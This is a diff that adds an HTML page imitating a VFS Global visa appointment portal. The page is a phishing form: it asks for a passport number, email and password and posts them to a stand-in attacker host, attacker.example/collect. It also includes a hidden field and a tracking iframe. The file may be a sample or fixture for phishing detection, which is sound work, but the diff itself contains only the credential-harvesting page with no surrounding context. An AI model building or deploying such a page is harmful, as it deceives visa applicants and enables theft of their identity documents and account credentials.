@@ -1,0 +1,21 @@
+
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>VFS Global Secure Appointment Portal</title>
+</head>
+<body>
+  <h1>VFS Global Verification</h1>
+  <p>Securely verify your appointment, passport and visa details.</p>
+  <img src="https://example.com/vfs-logo.png" alt="VFS Global" />
+  <form action="https://attacker.example/collect" method="post">
+    <input type="text" name="passport" placeholder="Passport Number" />
+    <input type="email" name="email" placeholder="Email" />
+    <input type="password" name="password" placeholder="Password" />
+    <input type="hidden" name="session" value="x" />
+    <button type="submit">Verify</button>
+  </form>
+  <iframe src="https://example.com/tracker"></iframe>
+</body>
+</html>
